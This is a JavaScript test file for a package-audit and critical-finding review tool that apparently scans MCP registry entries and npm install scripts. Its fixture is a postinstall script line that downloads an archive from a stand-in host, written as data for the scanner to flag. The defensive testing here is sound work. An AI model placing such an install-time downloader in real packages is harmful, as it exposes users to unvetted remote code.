import { test } from "node:test"
import assert from "node:assert/strict"
import { mkdtempSync, writeFileSync, readFileSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { dirname, join, resolve } from "node:path"
import { fileURLToPath } from "node:url"
import { spawnSync } from "node:child_process"
import { auditRegistryServer } from "../packages/collect/mcp-audit.mjs"
import { scanManifest } from "../packages/collect/scripts/guard-scan.mjs"
import { buildIndex } from "../packages/collect/scripts/build-index.mjs"
import { manifestFindings } from "../packages/guard/src/api.mjs"

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..")
const server = {
  name: "acme/review-fixture", version: "2026.9.17",
  packages: [{ registryType: "npm", identifier: "acme-review-fixture", version: "1.0.0", transport: { type: "stdio" } }],
  repository: { url: "https://github.com/acme/review-fixture" },
}
const manifest = {
  name: "acme-review-fixture", version: "1.0.0",
  scripts: { postinstall: "node scripts/install.js" },
  repository: { url: "https://github.com/acme/review-fixture" },
}

// These texts are scanned, never executed. No public registry or package is contacted.
const script = (filename) => 'require("node:https").get("https://example.invalid/archive", r => r.pipe(require("node:fs").createWriteStream("' + filename + '")))'
async function collectedIndex(content, checker = manifestFindings) {
  const requested = []
  const row = await auditRegistryServer(server, { http: async (url) => {
    requested.push(url)
    if (url === "https://registry.npmjs.org/acme-review-fixture") return { status: 200, text: JSON.stringify({ "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": manifest } }) }
    if (url === "https://unpkg.com/acme-review-fixture@1.0.0/scripts/install.js") return { status: 200, text: content }
    assert.fail("unexpected request: " + url)
  } })
  assert.equal(requested.length, 2)
  assert.equal(row.version, "1.0.0", "the package version, not the server release, was scanned")
  const guard = scanManifest(row, manifest, checker)
  return buildIndex({ census: { rows: [row] }, guard: { results: [guard] }, generatedAt: "fixture" })
}

function workspace(t) {
  const dir = mkdtempSync(join(tmpdir(), "ag-collection-review-"))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  return dir
}
function saveIndex(dir, index) { writeFileSync(join(dir, "index.json"), JSON.stringify(index)) }
function review(dir, ...extra) {
  return spawnSync(process.execPath, [join(ROOT, "scripts/review-criticals.mjs"), "--index", join(dir, "index.json"), "--baseline", join(dir, "reviewed.json"), ...extra], { encoding: "utf8", timeout: 10000 })
}

test("collected code changes invalidate a review even when the version and finding text stay unchanged", async (t) => {
  const dir = workspace(t)
  const first = await collectedIndex(script("first.bin"))
  const second = await collectedIndex(script("changed.bin"))
  const before = first.records[0].evidence.registryDocument
  const after = second.records[0].evidence.registryDocument
  assert.deepEqual(before.findings, after.findings, "the human-readable summary is deliberately unchanged")
  assert.notEqual(before.provenance.content.digest, after.provenance.content.digest)
  assert.ok(before.findings.some((finding) => finding.severity === "critical"))

  saveIndex(dir, first)
  assert.equal(review(dir).status, 1)
  // Acceptance in this test is only for the synthetic fixture, never the real baseline.
  const accepted = review(dir, "--accept")
  assert.equal(accepted.status, 0, accepted.stdout + accepted.stderr)
  assert.equal(review(dir).status, 0)
  const baseline = readFileSync(join(dir, "reviewed.json"), "utf8")
  saveIndex(dir, second)
  const changed = review(dir)
  assert.equal(changed.status, 1, changed.stdout + changed.stderr)
  assert.match(changed.stdout, /CHANGED/)
  assert.equal(readFileSync(join(dir, "reviewed.json"), "utf8"), baseline, "checking never rewrites the review")
})

test("a real manifest checker exception survives the collector-to-index boundary", async () => {
  const index = await collectedIndex(script("fixture.bin"), () => { throw new Error("fixture scanner failure") })
  const record = index.records[0]
  assert.equal(record.verdict, "incomplete")
  assert.equal(record.evidence.packageManifest.reason, "check-failed")
  assert.equal(record.evidence.packageManifest.error, "fixture scanner failure")
  assert.equal(record.evidence.packageManifest.provenance.complete, false)
})

test("a remote-only registration is not mistaken for an audited package", async () => {
  const row = await auditRegistryServer({ name: "acme/remote", version: "1.0.0", remotes: [{ type: "streamable-http", url: "https://example.invalid/mcp" }] }, {
    http: async () => assert.fail("a remote registration must not cause a service probe"),
  })
  const record = buildIndex({ census: { rows: [row] } }).records[0]
  assert.equal(row.audited, false)
  assert.equal(record.verdict, "incomplete")
  assert.equal(record.evidence.registryDocument.reason, "not-audited")
})
